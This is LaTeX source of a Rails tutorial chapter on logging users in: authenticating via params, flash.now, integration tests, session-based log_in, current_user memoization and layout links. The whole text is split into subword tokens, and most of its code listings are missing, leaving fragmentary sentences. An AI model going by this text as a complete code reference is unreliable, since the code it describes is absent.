▁C a ref ul ly ▁ inspect ing ▁the ▁debug ▁information ▁in ▁F igure ~\ ref { fig : initial _ failed _ login _ rails _3} ▁shows ▁that , ▁as ▁hint ed ▁at ▁the ▁end ▁of ▁Section ~\ ref { sec : login _ form }, ▁the ▁submission ▁results ▁in ▁a ▁\ k ode { params } ▁hash ▁containing ▁the ▁email ▁and ▁password ▁under ▁the ▁key ▁\ k ode { session }, ▁which ▁( o m it ting ▁some ▁irrelevant ▁details ▁used ▁internally ▁by ▁Rails ) ▁appears ▁as ▁follows :
▁As ▁with ▁the ▁case ▁of ▁user ▁signup ▁( F igure ~\ ref { fig : signup _ failure }), ▁these ▁parameters ▁form ▁a ▁\ emph { nested } ▁hash ▁like ▁the ▁one ▁we ▁saw ▁in ▁Listing ~\ ref { code : nested _ hashes }.
▁In ▁particular , ▁\ k ode { params } ▁contains ▁a ▁nested ▁hash ▁of ▁the ▁form
▁is ▁itself ▁a ▁hash :
▁As ▁a ▁result ,
▁is ▁the ▁submitted ▁email ▁address ▁and
▁is ▁the ▁submitted ▁password .
▁In ▁other ▁words , ▁inside ▁the ▁\ k ode { create } ▁action ▁the ▁\ k ode { params } ▁hash ▁has ▁all ▁the ▁information ▁needed ▁to ▁authenticate ▁users ▁by ▁email ▁and ▁password .
▁No t ▁co in cidentally , ▁we ▁already ▁have ▁exactly ▁the ▁methods ▁we ▁need : ▁the ▁\ k ode { User . find \_ by } ▁method ▁provided ▁by ▁Active ▁Record ▁( Section ~\ ref { sec : find ing _ user _ objects }) ▁and ▁the ▁\ k ode { authenticate } ▁method ▁provided ▁by ▁\ k ode { has \_ secure \_ password } ▁( Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }).
▁authentication
▁as ▁show n ▁in ▁Listing ~\ ref { code : find _ authenticate _ user }.
▁Find ing ▁and ▁ authenticating ▁a ▁user .
▁The ▁first ▁highlight ed ▁line ▁in ▁Listing ~\ ref { code : find _ authenticate _ user } ▁pull s ▁the ▁user ▁out ▁of ▁the ▁database ▁using ▁the ▁submitted ▁email ▁address .
▁( Re c all ▁from ▁Section ~\ ref { sec : uniqueness _ validation } ▁that ▁email ▁addresses ▁are ▁saved ▁as ▁all ▁lower - case , ▁so ▁here ▁we ▁use ▁the ▁\ k ode { downcase } ▁method ▁to ▁ensure ▁a ▁match ▁when ▁the ▁submitted ▁address ▁is ▁valid .)
▁The ▁next ▁line ▁can ▁be ▁a ▁bit ▁confusing ▁but ▁is ▁fai r ly ▁common ▁in ▁idiomatic ▁Rails ▁programming :
▁T a k ing ▁into ▁account ▁that ▁any ▁object ▁other ▁than ▁\ k ode { nil } ▁and ▁\ k ode { false } ▁itself ▁is ▁\ k ode { true } ▁in ▁a ▁boolean ▁context ▁( Section ~\ ref { sec : objects _ and _ message _ passing }), ▁the ▁possibilities ▁appear ▁as ▁in ▁Table ~\ ref { table : user _ and _ and }.
▁We ▁see ▁from ▁Table ~\ ref { table : user _ and _ and } ▁that ▁the ▁\ k ode { if } ▁statement ▁is ▁\ k ode { true } ▁only ▁if ▁a ▁user ▁with ▁the ▁given ▁email ▁both ▁exists ▁in ▁the ▁database ▁and ▁has ▁the ▁given ▁password , ▁exactly ▁as ▁required .
▁non ex ist ent
▁wrong ▁password
▁right ▁password
▁Recall ▁from ▁Section ~\ ref { sec : signup _ error _ messages } ▁that ▁we ▁displayed ▁signup ▁errors ▁using ▁the ▁User ▁model ▁error ▁messages .
▁These ▁errors ▁are ▁ associated ▁with ▁a ▁particular ▁Active ▁Record ▁object , ▁but ▁this ▁strategy ▁won ' t ▁work ▁here ▁because ▁the ▁session ▁is n ' t ▁an ▁Active ▁Record ▁model .
▁Instead , ▁we ' ll ▁put ▁a ▁message ▁in ▁the ▁flash ▁to ▁be ▁displayed ▁upon ▁failed ▁login .
▁A ▁first , ▁slightly ▁in correct , ▁attempt ▁appears ▁in ▁Listing ~\ ref { code : failed _ login _ attempt }.
▁An ▁( unsuccessful ) ▁attempt ▁at ▁handling ▁failed ▁login .
▁The ▁flash ▁message ▁for ▁a ▁failed ▁login .
▁U nfortunately , ▁as ▁noted ▁in ▁the ▁text ▁and ▁in ▁the ▁comment ▁in ▁Listing ~\ ref { code : failed _ login _ attempt }, ▁this ▁code ▁is n ' t ▁quite ▁right .
▁The ▁page ▁look s ▁fine , ▁though , ▁so ▁what ' s ▁the ▁problem ?
▁The ▁issue ▁is ▁that ▁the ▁contents ▁of ▁the ▁flash ▁persist ▁for ▁one ▁\ emph { request }, ▁but --- un like ▁a ▁redirect , ▁which ▁we ▁used ▁in ▁Listing ~\ ref { code : signup _ flash }--- re - render ing ▁a ▁template ▁with ▁\ k ode { render } ▁does n ' t ▁count ▁as ▁a ▁request . ▁The ▁result ▁is ▁that ▁the ▁flash ▁message ▁persist s ▁one ▁request ▁longer ▁than ▁we ▁want .
▁For ▁example , ▁if ▁we ▁submit ▁invalid ▁login ▁information ▁and ▁the n ▁click ▁on ▁the ▁Home ▁page , ▁the ▁flash ▁get s ▁displayed ▁a ▁second ▁time ▁( F igure ~\ ref { fig : flash _ persistence }).
▁Fix ing ▁this ▁blemish ▁is ▁the ▁task ▁of ▁Section ~\ ref { sec : a _ flash _ test }.
▁An ▁example ▁of ▁flash ▁ persistence .
▁\ label { fig : flash _ persistence } }< n >\ end { figure }< n >< n >< n > ▁% ▁sub subsection ▁rendering _ with _ a _ flash _ message ▁( end )< n >< n > ▁\ subsection { A ▁flash ▁test } ▁% ▁( fold )< n > ▁\ label { sec : a _ flash _ test }< n >< n >
▁The ▁in correct ▁flash ▁behavior ▁is ▁a ▁minor ▁bug ▁in ▁our ▁application .
▁We ' ll ▁thus ▁write ▁a ▁short ▁integration ▁test ▁for ▁the ▁login ▁form ▁submission ▁before ▁proceeding .
▁In ▁addition ▁to ▁document ing ▁the ▁bug ▁and ▁prevent ing ▁a ▁re gr es s ion , ▁this ▁will ▁also ▁give ▁us ▁a ▁good ▁foundation ▁for ▁further ▁integration ▁tests ▁of ▁login ▁and ▁ logout .
▁We ▁start ▁by ▁ generating ▁an ▁integration ▁test ▁for ▁our ▁application ' s ▁login ▁behavior :
▁Next , ▁we ▁need ▁a ▁test ▁to ▁capture ▁the ▁sequence ▁show n ▁in ▁F igure ~\ ref { fig : failed _ login _ flash } ▁and ▁F igure ~\ ref { fig : flash _ persistence }.
▁The ▁basic ▁steps ▁appear ▁as ▁follows :
▁Vi s it ▁the ▁login ▁path .
▁Verify ▁that ▁the ▁new ▁sessions ▁form ▁render s ▁properly .
▁ Post ▁to ▁the ▁sessions ▁path ▁with ▁an ▁invalid ▁\ k ode { params } ▁hash .
▁Verify ▁that ▁the ▁new ▁sessions ▁form ▁get s ▁re - render ed ▁and ▁that ▁a ▁flash ▁message ▁appears .
▁Vi s it ▁another ▁page ▁( such ▁as ▁the ▁Home ▁page ).
▁Verify ▁that ▁the ▁flash ▁message ▁\ emph { do es n ' t } ▁appear ▁on ▁the ▁new ▁page .
▁A ▁test ▁implement ing ▁the ▁above ▁steps ▁appears ▁in ▁Listing ~\ ref { code : flash _ persistence _ test }.
▁A ▁test ▁to ▁catch ▁un w ant ed ▁flash ▁ persistence .
▁login _ path
▁ $ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / integration / users _ login _ test . rb
▁This ▁shows ▁how ▁to ▁run ▁one ▁( and ▁only ▁one ) ▁test ▁file ▁using ▁the ▁argument ▁\ k ode { T E ST } ▁and ▁the ▁full ▁path ▁to ▁the ▁file .
▁The ▁way ▁to ▁get ▁the ▁failing ▁test ▁in ▁Listing ~\ ref { code : flash _ persistence _ test } ▁to ▁pass ▁is ▁to ▁replace ▁\ k ode { flash } ▁with ▁the ▁special ▁variant ▁\ k ode { flash . now }, ▁which ▁is ▁specifically ▁design ed ▁for ▁display ing ▁flash ▁messages ▁on ▁rendered ▁pages .
▁Un like ▁the ▁contents ▁of ▁\ k ode { flash }, ▁the ▁contents ▁of ▁\ k ode { flash . now } ▁disappear ▁as ▁soon ▁as ▁there ▁is ▁an ▁ additional ▁request , ▁which ▁is ▁exactly ▁the ▁behavior ▁we ' ve ▁test ed ▁in ▁Listing ~\ ref { code : flash _ persistence _ test }.
▁With ▁this ▁sub st it u t ion , ▁the ▁correct ed ▁application ▁code ▁appears ▁as ▁in ▁Listing ~\ ref { code : correct _ login _ failure }.
▁Co r re c t ▁code ▁for ▁failed ▁login .
▁We ▁can ▁the n ▁verify ▁that ▁both ▁the ▁login ▁integration ▁test ▁and ▁the ▁full ▁test ▁suite ▁are ▁\ passing :
▁ $ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / integration / users _ login _ test . rb < n > $ ▁bundle ▁exec ▁rake ▁test
▁Now ▁that ▁our ▁login ▁form ▁can ▁handle ▁invalid ▁submission s , ▁the ▁next ▁step ▁is ▁to ▁handle ▁valid ▁submission s ▁correctly ▁by ▁actually ▁logging ▁a ▁user ▁in .
▁In ▁this ▁section , ▁we ' ll ▁log ▁the ▁user ▁in ▁with ▁a ▁temporary ▁session ▁cookie ▁that ▁expire s ▁automatically ▁upon ▁browser ▁close .
▁In ▁Section ~\ ref { sec : remember _ me }, ▁we ' ll ▁add ▁sessions ▁that ▁persist ▁even ▁after ▁ closing ▁the ▁browser .
▁Implement ing ▁sessions ▁will ▁involve ▁defin ing ▁a ▁large ▁number ▁of ▁related ▁functions ▁for ▁use ▁across ▁multiple ▁controllers ▁and ▁views .
▁You ▁may ▁recall ▁from ▁Section ~\ ref { sec : back _ to _ the _ title _ helper } ▁that ▁Ruby ▁provides ▁a ▁\ emph { module } ▁facilit y ▁for ▁p ac k a g ing ▁such ▁functions ▁in ▁one ▁place .
▁Co n ve n i ent ly , ▁a ▁Sessions ▁helper ▁module ▁was ▁generated ▁automatically ▁when ▁ generating ▁the ▁Sessions ▁controller ▁( Section ~\ ref { sec : sessions _ controller }).
▁More over , ▁such ▁helpers ▁are ▁automatically ▁included ▁in ▁Rails ▁views ; ▁by ▁including ▁the ▁module ▁into ▁the ▁base ▁class ▁of ▁all ▁controllers ▁( the ▁Application ▁controller ), ▁we ▁arrange ▁to ▁make ▁them ▁available ▁in ▁our ▁controllers ▁as ▁well ▁( Listing ~\ ref { code : sessions _ helper _ include }).
▁ Includ ing ▁the ▁Sessions ▁helper ▁module ▁into ▁the ▁Application ▁controller .
▁With ▁this ▁configuration ▁complete , ▁we ' re ▁now ▁ready ▁to ▁write ▁the ▁code ▁to ▁log ▁users ▁in .
▁Logging ▁a ▁user ▁in ▁is ▁simple ▁with ▁the ▁help ▁of ▁the ▁\ k ode { session } ▁method ▁defined ▁by ▁Rails .
▁( This ▁method ▁is ▁separate ▁and ▁ distinct ▁from ▁the ▁Sessions ▁controller ▁generated ▁in ▁Section ~\ ref { sec : sessions _ controller }. )
▁We ▁can ▁treat ▁\ k ode { session } ▁as ▁if ▁it ▁were ▁a ▁hash , ▁and ▁assign ▁to ▁it ▁as ▁follows :
▁This ▁place s ▁a ▁temporary ▁cookie ▁on ▁the ▁user ' s ▁browser ▁containing ▁an ▁encrypted ▁version ▁of ▁the ▁user ' s ▁id , ▁which ▁allows ▁us ▁to ▁retrieve ▁the ▁id ▁on ▁subsequent ▁pages ▁using ▁\ k ode { session [: user \_ id ]} .
▁In ▁contrast ▁to ▁the ▁ persistent ▁cookie ▁created ▁by ▁the ▁\ k ode { cookies } ▁method ▁( Section ~\ ref { sec : remember _ me }), ▁the ▁temporary ▁cookie ▁created ▁by ▁the ▁\ k ode { session } ▁method ▁expire s ▁immediately ▁when ▁the ▁browser ▁is ▁close d .
▁Because ▁we ' ll ▁want ▁to ▁use ▁the ▁same ▁login ▁technique ▁in ▁a ▁couple ▁of ▁different ▁place s , ▁we ' ll ▁define ▁a ▁method ▁called ▁\ k ode { log \_ in } ▁in ▁the ▁Sessions ▁helper , ▁as ▁show n ▁in ▁Listing ~\ ref { code : log _ in _ function }.
▁The ▁\ k ode { log \_ in } ▁function .
▁Because ▁temporary ▁cookies ▁created ▁using ▁the ▁\ k ode { session } ▁method ▁are ▁automatically ▁encrypted , ▁the ▁code ▁in ▁Listing ~\ ref { code : log _ in _ function } ▁is ▁secure , ▁and ▁there ▁is ▁no ▁way ▁for ▁an ▁attacker ▁to ▁use ▁the ▁session ▁information ▁to ▁log ▁in ▁as ▁the ▁user .
▁This ▁applies ▁only ▁to ▁temporary ▁sessions ▁in it i at ed ▁with ▁the ▁\ k ode { session } ▁method , ▁though , ▁and ▁is ▁\ emph { not } ▁the ▁case ▁for ▁ persistent ▁sessions ▁created ▁using ▁the ▁\ k ode { cookies } ▁method .
▁P er ma n ent ▁cookies ▁are ▁vulnerable ▁to ▁a ▁\ emph { session ▁ hijack ing } ▁attack , ▁so ▁in ▁Section ~\ ref { sec : remember _ me } ▁we ' ll ▁have ▁to ▁be ▁much ▁more ▁careful ▁about ▁the ▁information ▁we ▁place ▁on ▁the ▁user ' s ▁browser .
▁With ▁the ▁\ k ode { log \_ in } ▁method ▁defined ▁in ▁Listing ~\ ref { code : log _ in _ function }, ▁we ' re ▁now ▁ready ▁to ▁complete ▁the ▁session ▁\ k ode { create } ▁action ▁by ▁logging ▁the ▁user ▁in ▁and ▁redirect ing ▁to ▁the ▁user ' s ▁profile ▁page .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : log _ in _ success }
▁The ▁\ k ode { log \_ in } ▁method ▁is ▁available ▁in ▁the ▁Sessions ▁controller ▁because ▁of ▁the ▁module ▁inclusion ▁in ▁Listing ~\ ref { code : sessions _ helper _ include }.
▁Logging ▁in ▁a ▁user .
▁Note ▁the ▁compact ▁redirect
▁which ▁we ▁saw ▁before ▁in ▁Section ~\ ref { sec : the _ f in is h ed _ signup _ form }.
▁Rails ▁automatically ▁convert s ▁this ▁to ▁the ▁route ▁for ▁the ▁user ' s ▁profile ▁page :
▁With ▁the ▁\ k ode { create } ▁action ▁defined ▁in ▁Listing ~\ ref { code : log _ in _ success }, ▁the ▁login ▁form ▁defined ▁in ▁Listing ~\ ref { code : login _ form } ▁should ▁now ▁be ▁working .
▁It ▁does n ' t ▁have ▁any ▁effect s ▁on ▁the ▁application ▁display , ▁though , ▁so ▁short ▁of ▁ inspect ing ▁the ▁browser ▁session ▁directly ▁there ' s ▁no ▁way ▁to ▁tell ▁that ▁you ' re ▁logged ▁in .
▁As ▁a ▁first ▁step ▁toward ▁ en a b l ing ▁more ▁visible ▁changes , ▁in ▁Section ~\ ref { sec : current _ user } ▁we ' ll ▁retrieve ▁the ▁current ▁user ▁from ▁the ▁database ▁using ▁the ▁id ▁in ▁the ▁session .
▁In ▁Section ~\ ref { sec : cha n g ing _ the _ layout _ links }, ▁we ' ll ▁change ▁the ▁links ▁on ▁the ▁application ▁layout , ▁including ▁a ▁URL ▁to ▁the ▁current ▁user ' s ▁profile .
▁Having ▁placed ▁the ▁user ' s ▁id ▁secure ly ▁in ▁the ▁temporary ▁session , ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁retrieve ▁it ▁on ▁subsequent ▁pages , ▁which ▁we ' ll ▁do ▁by ▁defin ing ▁a ▁\ k ode { current \_ user } ▁method ▁to ▁find ▁the ▁user ▁in ▁the ▁database ▁corresponding ▁to ▁the ▁session ▁id .
▁The ▁purpose ▁of ▁\ k ode { current \_ user } ▁is ▁to ▁allow ▁construction s ▁such ▁as
▁To ▁find ▁the ▁current ▁user , ▁one ▁possibility ▁is ▁to ▁use ▁the ▁\ k ode { find } ▁method , ▁as ▁on ▁the ▁user ▁profile ▁page ▁( Listing ~\ ref { code : user _ show _ action }) :
▁But ▁recall ▁from ▁Section ~\ ref { sec : find ing _ user _ objects } ▁that ▁\ k ode { find } ▁raise s ▁an ▁exception ▁if ▁the ▁user ▁id ▁does n ' t ▁exist .
▁This ▁behavior ▁is ▁appropriate ▁on ▁the ▁user ▁profile ▁page ▁because ▁it ▁will ▁only ▁happen ▁if ▁the ▁id ▁is ▁invalid , ▁but ▁in ▁the ▁present ▁case ▁\ k ode { session [: user \_ id ]} ▁will ▁often ▁be ▁\ k ode { nil } ▁( i . e . , ▁for ▁non - logged - in ▁users ).
▁To ▁handle ▁this ▁possibility , ▁we ' ll ▁use ▁the ▁same ▁\ k ode { find \_ by } ▁method ▁used ▁to ▁find ▁by ▁email ▁address ▁in ▁the ▁\ k ode { create } ▁method , ▁with ▁\ k ode { id } ▁in ▁place ▁of ▁\ k ode { email } :
▁R ather ▁than ▁rais ing ▁an ▁exception , ▁this ▁method ▁returns ▁\ k ode { nil } ▁( indicat ing ▁no ▁such ▁user ) ▁if ▁the ▁id ▁is ▁invalid .
▁We ▁could ▁now ▁define ▁the ▁\ k ode { current \_ user } ▁method ▁as ▁follows :
▁This ▁would ▁work ▁fine , ▁but ▁it ▁would ▁hit ▁the ▁database ▁multiple ▁time s ▁if , ▁e . g . , ▁\ k ode { current \_ user } ▁appear ed ▁multiple ▁time s ▁on ▁a ▁page .
▁Instead , ▁we ' ll ▁follow ▁a ▁common ▁Ruby ▁convention ▁by ▁storing ▁the ▁result ▁of ▁\ k ode { User . find \_ by } ▁in ▁an ▁instance ▁variable , ▁which ▁hit s ▁the ▁database ▁the ▁first ▁time ▁but ▁returns ▁the ▁instance ▁variable ▁immediately ▁on ▁subsequent ▁ invocation s
▁This ▁practice ▁of ▁remember ing ▁variable ▁assignment s ▁from ▁one ▁method ▁ invocation ▁to ▁the ▁next ▁is ▁known ▁as ▁\ href { http :// en . wiki p edia . org / wiki / M emoiz ation }{\ emph { m emoiz ation } }.
▁( Note ▁that ▁this ▁is ▁a ▁technical ▁ ter m ; ▁in ▁particular , ▁it ' s ▁\ emph { not } ▁a ▁m is s p e ll ing ▁of ▁`` me m or i z ation '' .)
▁Recall ing ▁the ▁\ emph { or } ~ o p er at or ▁\ text tt {|| } ▁seen ▁in ▁Section ~\ ref { sec : objects _ and _ message _ passing }, ▁we ▁can ▁re write ▁this ▁as ▁follows :
▁Because ▁a ▁User ▁object ▁is ▁true ▁in ▁a ▁boolean ▁context , ▁the ▁call ▁to ▁\ k ode { find \_ by } ▁only ▁get s ▁executed ▁if ▁\ k ode {@ current \_ user } ▁has n ' t ▁yet ▁been ▁assign ed .
▁A lthough ▁the ▁pre c ed ing ▁code ▁would ▁work , ▁it ' s ▁not ▁idiomatic ally ▁correct ▁Ruby ; ▁instead , ▁the ▁proper ▁way ▁to ▁write ▁the ▁assignment ▁to ▁\ k ode {@ current \_ user } ▁is ▁like ▁this :
▁@ current _ user ▁ ||= ▁User . find _ by ( id : ▁session [: user _ id ])
▁The ▁\ text tt { ||= } ▁( ` ` or ▁equal s '') ▁assignment ▁operator ▁is ▁a ▁common ▁Ruby ▁idiom ▁and ▁is ▁thus ▁important ▁for ▁as p ir ing ▁Rails ▁developers ▁to ▁recognize .
▁A lthough ▁at ▁first ▁it ▁may ▁seem ▁mysterious , ▁\ emph { or ▁equal s } ▁is ▁easy ▁to ▁understand ▁by ▁analogy .
▁We ▁start ▁by ▁noting ▁the ▁common ▁pattern ▁of ▁increment ing ▁a ▁variable :
▁< n >< n >\ begin { ve rb at i m }
▁< n > ▁x ▁= ▁x ▁ + ▁1
▁M any ▁languages ▁provide ▁a ▁ s y n t ac tic ▁shortcut ▁for ▁this ▁operation ; ▁in ▁Ruby ▁( and ▁in ▁C , ▁C ++ , ▁P er l , ▁P y th on , ▁Java , ▁etc .) , ▁it ▁can ▁also ▁appear ▁as ▁follows :
▁< n > ▁x ▁ + = ▁1
▁An a log ous ▁construct s ▁exist ▁for ▁other ▁operator s ▁as ▁well :
▁< n > ▁ $ ▁rails ▁console < n > ▁ >> ▁x ▁= ▁1 < n > ▁=> ▁1 < n > ▁ >> ▁x ▁ + = ▁1 < n > ▁=> ▁2 < n > ▁ >> ▁x ▁* = ▁3 < n > ▁=> ▁6 < n > ▁ >> ▁x ▁- = ▁ 8 < n > ▁=> ▁- 2 < n > ▁ >> ▁x ▁/ = ▁2 < n > ▁=> ▁- 1
▁In ▁each ▁case , ▁the ▁pattern ▁is ▁that ▁\ text tt { x ▁= ▁x ▁O ▁ y } ▁and ▁\ text tt { x ▁O = ▁ y } ▁are ▁equivalent ▁for ▁any ▁operator ▁\ text tt { O }.
▁A nother ▁common ▁Ruby ▁pattern ▁is ▁assign ing ▁to ▁a ▁variable ▁if ▁it ' s ▁\ text tt { nil } ▁but ▁otherwise ▁leav ing ▁it ▁ al one .
▁Recall ing ▁the ▁\ emph { or } ~ o p er at or ▁\ text tt {|| } ▁seen ▁in ▁Section ~\ ref { sec : objects _ and _ message _ passing }, ▁we ▁can ▁write ▁this ▁as ▁follows :
▁< n > ▁ >> ▁@ foo < n > ▁=> ▁nil < n > ▁ >> ▁@ foo ▁= ▁@ foo ▁|| ▁" bar " < n > ▁=> ▁" bar " < n > ▁ >> ▁@ foo ▁= ▁@ foo ▁|| ▁" baz " < n > ▁=> ▁" bar "
▁S ince ▁\ text tt { nil } ▁is ▁false ▁in ▁a ▁boolean ▁context , ▁the ▁first ▁assignment ▁to ▁\ text tt {@ foo } ▁is ▁\ text tt { nil ▁|| ▁" bar " }, ▁which ▁evaluate s ▁to ▁\ text tt {" bar " }.
▁Similar ly , ▁the ▁second ▁assignment ▁is ▁\ text tt {@ foo ▁|| ▁" baz " }, ▁i . e . , ▁\ text tt {" bar " ▁|| ▁" baz " }, ▁which ▁also ▁evaluate s ▁to ▁\ text tt {" bar " }.
▁This ▁is ▁because ▁anything ▁other ▁than ▁\ text tt { nil } ▁or ▁\ text tt { false } ▁is ▁\ text tt { true } ▁in ▁a ▁boolean ▁context , ▁and ▁the ▁series ▁of ▁\ text tt {|| } ▁expression s ▁ ter m in ate s ▁after ▁the ▁first ▁true ▁expression ▁is ▁evaluated .
▁( This ▁practice ▁of ▁evaluat ing ▁\ text tt {|| } ▁expression s ▁from ▁left ▁to ▁right ▁and ▁stop p ing ▁on ▁the ▁first ▁true ▁value ▁is ▁known ▁as ▁\ emph { s h or t - c ir c u it ▁evaluat ion }.
▁ Compar ing ▁the ▁console ▁sessions ▁for ▁the ▁ various ▁operator s , ▁we ▁see ▁that ▁\ text tt {@ foo ▁= ▁@ foo ▁|| ▁" bar "} ▁follows ▁the ▁\ text tt { x ▁= ▁x ▁O ▁ y } ▁pattern ▁with ▁\ text tt {|| } ▁in ▁the ▁place ▁of ▁\ text tt { O } :
▁< n > ▁x ▁= ▁x ▁ + ▁1 ▁-> ▁x ▁ + = ▁1 < n > ▁x ▁= ▁x ▁* ▁3 ▁-> ▁x ▁* = ▁3 < n > ▁x ▁= ▁x ▁- ▁ 8 ▁-> ▁x ▁- = ▁ 8 < n > ▁x ▁= ▁x ▁/ ▁2 ▁-> ▁x ▁/ = ▁2 < n > ▁@ foo ▁= ▁@ foo ▁|| ▁" bar " ▁-> ▁@ foo ▁ ||= ▁" bar "
▁In ▁the ▁context ▁of ▁the ▁current ▁user , ▁this ▁suggest s ▁the ▁following ▁construction :
▁( B y ▁the ▁way , ▁under ▁the ▁hood ▁Ruby ▁actually ▁evaluate s ▁the ▁expression ▁\ text tt {@ foo ▁|| ▁@ foo ▁= ▁" bar " }, ▁which ▁avoid s ▁an ▁unnecessary ▁assignment ▁when ▁\ text tt {@ foo } ▁is ▁\ text tt { nil } ▁or ▁\ text tt { false }.
▁But ▁this ▁expression ▁does n ' t ▁ explain ▁the ▁\ text tt { ||= } ▁notation ▁as ▁well , ▁so ▁the ▁above ▁discussion ▁uses ▁the ▁ nearly ▁equivalent ▁\ text tt {@ foo ▁= ▁@ foo ▁|| ▁" bar "} .)
▁in ▁Listing ~\ ref { code : current _ user }.
▁Find ing ▁the ▁current ▁user ▁in ▁the ▁session .
▁With ▁the ▁working ▁\ k ode { current \_ user } ▁method ▁in ▁Listing ~\ ref { code : current _ user }, ▁we ' re ▁now ▁in ▁a ▁position ▁to ▁make ▁changes ▁to ▁our ▁application ▁base d ▁on ▁user ▁login ▁status .
▁The ▁first ▁practical ▁application ▁of ▁logging ▁in ▁involve s ▁changing ▁the ▁layout ▁links ▁base d ▁on ▁login ▁status .
▁Note ▁in ▁F igure ~\ ref { fig : login _ success _ mockup } ▁that ▁the ▁ logout ▁and ▁profile ▁links ▁appear ▁in ▁a ▁ drop d own ▁`` Account '' ▁menu ; ▁we ' ll ▁see ▁in ▁Listing ~\ ref { code : layout _ login _ logout _ links } ▁how ▁to ▁make ▁such ▁a ▁menu ▁with ▁Bootstrap .
▁A ▁mockup ▁of ▁the ▁user ▁profile ▁after ▁a ▁successful ▁login .
▁At ▁this ▁point , ▁in ▁real ▁life ▁I ▁would ▁consider ▁writing ▁an ▁integration ▁test ▁to ▁capture ▁the ▁behavior ▁describe d ▁above .
▁In ▁this ▁case , ▁though , ▁such ▁a ▁test ▁involve s ▁sever al ▁new ▁idea s , ▁so ▁for ▁now ▁it ' s ▁best ▁def er r ed ▁to ▁its ▁own ▁section ▁( Section ~\ ref { sec : test ing _ layout _ change s }).
▁The ▁way ▁to ▁change ▁the ▁links ▁in ▁the ▁site ▁layout ▁involve s ▁using ▁an < n > if - else ▁statement ▁inside ▁ embedded ▁Ruby ▁to ▁show ▁one ▁set ▁of ▁links ▁if ▁the ▁user ▁is ▁logged ▁in ▁and ▁another ▁set ▁of ▁links ▁otherwise :
▁This ▁kind ▁of ▁code ▁requires ▁the ▁exist ence ▁of ▁a ▁\ k ode { logged \_ in ?}\ ▁boolean ▁method , ▁which ▁we ' ll ▁now ▁define .
▁Check ing ▁for ▁this ▁requires ▁the ▁use ▁of ▁the ▁`` not '' ▁operator ▁( Section ~\ ref { sec : objects _ and _ message _ passing }), ▁written ▁using ▁an ▁excl am ation ▁point ~\ k ode { ! } ▁and ▁usually ▁read ▁as ▁`` bang ''.
▁The ▁result ing ▁\ k ode { logged \_ in ?}\ ▁method ▁appears ▁in ▁Listing ~\ ref { code : logged _ in _ p }.
▁The ▁\ k ode { logged \_ in ?}\
▁With ▁addition ▁in ▁Listing ~\ ref { code : logged _ in _ p }, ▁we ' re ▁now ▁ready ▁to ▁change ▁the ▁layout ▁links ▁if ▁a ▁user ▁is ▁logged ▁in .
▁There ▁are ▁four ▁new ▁links , ▁two ▁of ▁which ▁are ▁ stub b ed ▁out ▁( to ▁be ▁complete d ▁in ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }) :
▁The ▁ logout ▁link , ▁mean w h i le , ▁uses ▁the ▁ logout ▁path ▁defined ▁in ▁Listing ~\ ref { code : sessions _ resource } :
▁Web ▁browsers ▁can ' t ▁actually ▁issue ▁\ text tt { DELETE } ▁requests ; ▁Rails ▁fake s ▁it ▁with ▁JavaScript .
▁Here ▁we ▁could ▁write
▁but ▁as ▁usual ▁Rails ▁allows ▁us ▁to ▁link ▁directly ▁to ▁the ▁user ▁by ▁automatically ▁convert ing ▁\ k ode { current \_ user } ▁into ▁\ k ode { user \_ path ( current \_ user )} ▁in ▁this ▁context .
▁F inally , ▁when ▁users ▁\ emph { ar en ' t } ▁logged ▁in , ▁we ' ll ▁use ▁the ▁login ▁path ▁defined ▁in ▁Listing ~\ ref { code : sessions _ resource } ▁to ▁make ▁a ▁link ▁to ▁the ▁login ▁form :
▁P utting ▁everything ▁together ▁gives ▁the ▁updated ▁header ▁partial ▁show n ▁in ▁Listing ~\ ref { code : layout _ login _ logout _ links }.
▁ Chang ing ▁the ▁layout ▁links ▁for ▁logged - in ▁users .
▁</ li >
▁See ▁the ▁\ href { http :// get bootstrap . com / com p on ent s /}{ Bootstrap ▁components ▁page } ▁for ▁more ▁information .
▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ js }.
▁ Adding ▁the ▁Bootstrap ▁JavaScript ▁library ▁to ▁\ k ode { application . js }.
▁ //= ▁require ▁ jquery
▁ //= ▁require ▁ jquery _ u js
▁ //= ▁require ▁ bootstrap
▁ //= ▁require _ tree ▁ .
▁in ▁Listing ~\ ref { code : layout _ login _ logout _ links } ▁and
▁If ▁you ▁ quit ▁your ▁browser ▁completely , ▁you ▁should ▁also ▁be ▁able ▁to ▁verify ▁that ▁the ▁application ▁ forget s ▁your ▁login ▁status , ▁requiring ▁you ▁to ▁log ▁in ▁again ▁to ▁see ▁the ▁changes ▁describe d ▁above .
▁A ▁logged - in ▁user ▁with ▁new ▁links ▁and ▁a ▁ drop d own ▁menu .
▁Having ▁verifie d ▁by ▁hand ▁that ▁the ▁application ▁is ▁be having ▁properly ▁upon ▁successful ▁login , ▁before ▁mov ing ▁on ▁we ' ll ▁write ▁an ▁integration ▁test ▁to ▁capture ▁that ▁behavior ▁and ▁catch ▁re gr es s ion s .
▁We ' ll ▁build ▁on ▁the ▁test ▁from ▁Listing ~\ ref { code : flash _ persistence _ test } ▁and ▁write ▁a ▁series ▁of ▁steps ▁to ▁verify ▁the ▁following ▁sequence ▁of ▁actions :
▁ Post ▁valid ▁information ▁to ▁the ▁sessions ▁path .
▁Verify ▁that ▁the ▁login ▁link ▁disappear s .
▁Verify ▁that ▁a ▁ logout ▁link ▁appears
▁Verify ▁that ▁a ▁profile ▁link ▁appears .
▁In ▁order ▁to ▁see ▁these ▁changes , ▁our ▁test ▁needs ▁to ▁log ▁in ▁as ▁a ▁previous ly ▁registered ▁user , ▁which ▁means ▁that ▁such ▁a ▁user ▁must ▁already ▁exist ▁in ▁the ▁database .
▁The ▁default ▁Rails ▁way ▁to ▁do ▁this ▁is ▁to ▁use ▁\ emph { fixtures }, ▁which ▁are ▁a ▁way ▁of ▁ org an i z ing ▁data ▁to ▁be ▁loaded ▁into ▁the ▁test ▁database .
